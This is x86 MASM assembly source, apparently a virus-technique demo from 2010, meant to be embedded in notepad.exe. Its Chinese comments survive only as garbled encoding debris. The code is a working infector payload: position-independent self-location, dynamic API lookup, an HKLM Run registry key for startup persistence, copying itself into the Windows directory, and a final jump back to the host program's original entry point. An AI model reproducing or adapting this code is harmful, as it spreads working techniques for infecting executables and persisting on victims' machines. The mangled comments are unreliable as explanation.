;------------------------
; ���ܣ��ļ��Ͳ��� ��ʾ��
;       �ؼ����뽫Ƕ�뵽notepad.exe�ļ��ڵļ�϶��
; ���ߣ�����
; �������ڣ�2010.7.1
;------------------------
    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc
include    kernel32.inc
includelib kernel32.lib
include    ADVAPI32.inc
includelib ADVAPI32.lib



    .code
_ProtoRegCreateKey            typedef proto :dword,:dword,:dword
_ProtoRegSetValueEx           typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoMessageBox              typedef proto :dword,:dword,:dword,:dword
_ProtoGetWindowsDirectory     typedef proto :dword,:dword
_ProtoGetModuleFileName       typedef proto :dword,:dword,:dword
_ProtoCopyFile                typedef proto :dword,:dword,:dword
_ProtoCreateFile              typedef proto :dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoGetFileSize             typedef proto :dword,:dword
_ProtoCreateFileMapping       typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoDeleteFile              typedef proto :dword


_ApiRegCreateKey              typedef ptr _ProtoRegCreateKey
_ApiRegSetValueEx             typedef ptr _ProtoRegSetValueEx
_ApiMessageBox                typedef ptr _ProtoMessageBox
_ApiGetWindowsDirectory       typedef ptr _ProtoGetWindowsDirectory
_ApiGetModuleFileName         typedef ptr _ProtoGetModuleFileName
_ApiCopyFile                  typedef ptr _ProtoCopyFile
_ApiCreateFile                typedef ptr _ProtoCreateFile
_ApiGetFileSize               typedef ptr _ProtoGetFileSize
_ApiCreateFileMapping         typedef ptr _ProtoCreateFileMapping
_ApiDeleteFile                typedef ptr _ProtoDeleteFile


lpszKey             db   'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\Run',0  
lpszValueName       db   'note',0  
lpszValue           db   'virNote.exe',0  
hKey                dd   ?
hFile               dd   ?
hMapFile            dd   ?
lpMemory            dd   ?   ;�ڴ����ļ�ָ��

hDllADVAPI32        dd   ?   ;���advapi32.dll���
hDllUser32          dd   ?   ;���user32.dll���
hDllKernel32        dd   ?   ;���kernel32.dll���


@destFile           db   50h dup(0)
szBuffer            db   50h dup(0)
dwFileSize          dd   ?   ;����ļ���С
_dwSize             dd   ?

_RegCreateKey             _ApiRegCreateKey           ?
_RegSetValueEx            _ApiRegSetValueEx          ?
_MessageBox               _ApiMessageBox             ?
_GetWindowsDirectory      _ApiGetWindowsDirectory    ?
_GetModuleFileName        _ApiGetModuleFileName      ?
_CopyFile                 _ApiCopyFile               ?
_CreateFile               _ApiCreateFile             ?
_GetFileSize              _ApiGetFileSize            ?
_CreateFileMapping        _ApiCreateFileMapping      ?
_DeleteFile               _ApiDeleteFile             ?


szADVAPI32               db  'ADVAPI32.dll',0
szUser32                 db  'USER32.dll',0
szKernel32               db  'KERNEL32.dll',0
szRegCreateKey           db  'RegCreateKeyA',0        ;�÷�����ADVAPI32.dll��
szRegSetValueEx          db  'RegSetValueExA',0       ;�÷�����ADVAPI32.dll��
szMessageBox             db  'MessageBoxA',0          ;�÷�����USER32.dll��
szGetWindowsDirectory    db  'GetWindowsDirectoryA',0 ;���·�����KERNEL32.dll��
szGetModuleFileName      db  'GetModuleFileNameA',0
szCopyFile               db  'CopyFileA',0
szCreateFile             db  'CreateFileA',0
szGetFileSize            db  'GetFileSize',0
szCreateFileMapping      db  'CreateFileMappingA',0
szDeleteFile             db  'DeleteFileA',0

lpszTitle         db  '�ļ�������ʾ��-by qixiaorui',0
lpszMessage       db  '��ע�⣡���Ļ�������һ��ʹ��ʱ�����Ѿ���Ⱦ���ļ��Ͳ�����',0
lpszNewName       db  '\virNote_Bak.exe',0


start:
    call @F
@@: 
    pop ebp
    sub ebp,offset @B
    
    ;���Ȼ�ȡADVAPI32.dll��kernel32.dll��user32.dll�Ļ�ַ

    lea eax,[ebp+szADVAPI32]
    push eax
    call LoadLibrary              ;��������������������Ҫ����
    mov [ebp+hDllADVAPI32],eax

    lea eax,[ebp+szUser32]
    push eax
    call LoadLibrary              ;��������������������Ҫ����
    mov [ebp+hDllUser32],eax

    lea eax,[ebp+szKernel32]
    push eax
    call LoadLibrary              ;��������������������Ҫ����
    mov [ebp+hDllKernel32],eax
    
    ;��ü����������ڴ��ַ
    lea eax,[ebp+szRegCreateKey]
    push eax
    mov eax,[ebp+hDllADVAPI32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_RegCreateKey],eax

    lea eax,[ebp+szRegSetValueEx]
    push eax
    mov eax,[ebp+hDllADVAPI32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_RegSetValueEx],eax
   
    lea eax,[ebp+szMessageBox]
    push eax
    mov eax,[ebp+hDllUser32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_MessageBox],eax

    lea eax,[ebp+szGetWindowsDirectory]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_GetWindowsDirectory],eax

    lea eax,[ebp+szGetModuleFileName]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_GetModuleFileName],eax
   
    lea eax,[ebp+szCopyFile]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_CopyFile],eax

    lea eax,[ebp+szCreateFile]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_CreateFile],eax

    lea eax,[ebp+szGetFileSize]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_GetFileSize],eax

    lea eax,[ebp+szCreateFileMapping]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_CreateFileMapping],eax

    lea eax,[ebp+szDeleteFile]
    push eax
    mov eax,[ebp+hDllKernel32]
    push eax
    call GetProcAddress           ;��������������������Ҫ����
    mov [ebp+_DeleteFile],eax


    ;��ֵд��ע���   
    lea eax,[ebp+hKey]
    push eax
    lea eax,[ebp+lpszKey]
    push eax
    push HKEY_LOCAL_MACHINE
    call [ebp+_RegCreateKey]
    mov eax,0Ch
    push eax
    lea eax,[ebp+lpszValue]
    push eax
    mov eax,REG_SZ
    push eax
    xor eax,eax
    push eax
    lea eax,[ebp+lpszValueName]
    push eax
    mov eax,[ebp+hKey]
    push eax
    call [ebp+_RegSetValueEx]
    mov eax,[ebp+hKey]
    push eax
    call RegCloseKey             ;��������������������Ҫ����

    ;��ȡ�������ڵ�Ŀ¼
    mov eax,50h
    push eax
    lea eax,[ebp+szBuffer]
    push eax
    call [ebp+_GetWindowsDirectory]

    mov esi,0
    mov edi,0
    .while TRUE
        mov al,byte ptr [ebp+szBuffer+esi]
        .break .if al==0
        mov byte ptr [ebp+@destFile+edi],al
        inc esi
        inc edi
    .endw
    mov esi,0
    .while TRUE
        mov al,byte ptr [ebp+lpszNewName+esi]
        .break .if al==0
        mov byte ptr [ebp+@destFile+edi],al
        inc esi
        inc edi
    .endw
    mov byte ptr [ebp+@destFile+edi],0

    ;ȡ��ǰ��������·��c:\winnt\virNote.exe
    mov eax,50h
    push eax
    lea eax,[ebp+szBuffer]
    push eax
    xor eax,eax
    push eax
    call [ebp+_GetModuleFileName]

    ;����ǰ���������ļ�szBuffer������ϵͳĿ¼@destFile
    mov eax,FALSE
    push eax
    lea eax,[ebp+@destFile]
    push eax
    lea eax,[ebp+szBuffer]
    push eax
    call [ebp+_CopyFile]

    ;������������ļ�@destFile
    push NULL
    mov eax,FILE_ATTRIBUTE_ARCHIVE
    push eax
    mov eax,OPEN_EXISTING
    push eax
    push NULL
    mov eax,FILE_SHARE_READ or FILE_SHARE_WRITE
    push eax
    mov eax,GENERIC_READ
    push eax
    lea eax,[ebp+@destFile]
    push eax
    call [ebp+_CreateFile]

    mov [ebp+hFile],eax   ;���ļ����������Ӧ����

    push NULL
    push eax
    call [ebp+_GetFileSize]
    mov [ebp+dwFileSize],eax

    ;�����ڴ�ӳ��
    xor eax,eax
    push eax
    push eax
    push eax
    mov eax,PAGE_READONLY
    push eax
    xor eax,eax
    push eax
    mov eax,[ebp+hFile]
    push eax
    call [ebp+_CreateFileMapping]
    mov [ebp+hMapFile],eax

    ;���ļ�ӳ�䵽�ڴ�
    xor eax,eax
    push eax
    push eax
    push eax
    mov eax,FILE_MAP_READ
    push eax
    mov eax,[ebp+hMapFile]
    push eax
    call MapViewOfFile         ;��������������������Ҫ����
    mov [ebp+lpMemory],eax     ;����ļ����ڴ�ӳ�����ʼλ��

    mov esi,[ebp+lpMemory]
    add esi,3ch  
    mov esi,dword ptr [esi]
    add esi,[ebp+lpMemory]     
    push esi
    pop edi                    ;esi��edi��ָ��PEͷ

    movzx ecx,word ptr [esi+6h] ;��ȡ�ڵ�����  
    mov eax,sizeof IMAGE_NT_HEADERS
    add edi,eax                ;ediָ���Ŀ¼
    
    ;�����Ŀ¼���ݵ��ܳ���
    mov eax,sizeof IMAGE_SECTION_HEADER
    xor edx,edx
    mul ecx
    xchg eax,ecx               ;ecx��Ϊ��Ŀ¼���ݵ��ܳ���
    
    ;�����ediָ���ecx�����ȵ��ֽڵ�У���
_calcCheckSum:
 
    mov [ebp+_dwSize],ecx
    push esi
    shr ecx,1
    xor ebx,ebx
    mov esi,edi

    cld
@@:
    lodsw
    movzx eax,ax
    add ebx,eax
    loop @B
    test [ebp+_dwSize],1
    jz @F
    lodsb
    movzx eax,al
    add ebx,eax
@@:
    mov eax,ebx
    and eax,0ffffh
    shr ebx,16
    add eax,ebx
    not ax
    pop esi


    mov bx,word ptr [esi+4ch]   ;�˴������ԭʼ��У���
    sub ax,bx
    jz _ret
    
    ;��ʾ��ʾ��Ϣ
    xor eax,eax
    push eax
    lea eax,[ebp+lpszTitle]
    push eax
    lea eax,[ebp+lpszMessage]
    push eax
    push NULL
    call [ebp+_MessageBox]

_ret:
    ;�ر��ļ�
    mov eax,[ebp+lpMemory]   
    push eax
    call UnmapViewOfFile       ;��������������������Ҫ����
 
    mov eax,[ebp+hMapFile]
    push eax
    call CloseHandle           ;��������������������Ҫ����

    mov eax,[ebp+hFile]
    push eax
    call CloseHandle           ;��������������������Ҫ����

    ;ɾ���ļ�
    lea eax,[ebp+@destFile]
    push eax
    call [ebp+_DeleteFile]

    ret
    ;�˴������ã�����Ҫ����
    mov eax,12345678h
    org $-4
OldEIP  dd  00001000h
    add eax,12345678h
    org $-4
ModBase dd  00400000h
    jmp eax
    end start
